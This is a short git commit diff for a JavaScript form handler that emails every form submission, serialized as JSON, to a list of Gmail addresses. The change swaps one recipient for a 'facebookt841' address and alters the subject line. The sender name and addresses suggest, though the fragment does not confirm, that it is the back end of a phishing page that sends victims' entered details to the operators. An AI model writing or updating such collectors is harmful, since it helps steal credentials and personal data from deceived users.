7788669bb06b0fe733e62f1388258e6f9f079457
zm9807350 <zm9807350@gmail.com>
2026-03-04 17:58:16 +0500

    Update and rename kk.js to maqbool.js

--- maqbool.js
+++ maqbool.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,submitdispute@gmail.com,nizamaniaqsa41@gmail.com,newzatpage@gmail.com",
-      subject: "kk",
+      to: "linkquarry@gmail.com,submitdispute@gmail.com,facebookt841@gmail.com,newzatpage@gmail.com",
+      subject: "maqbool",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
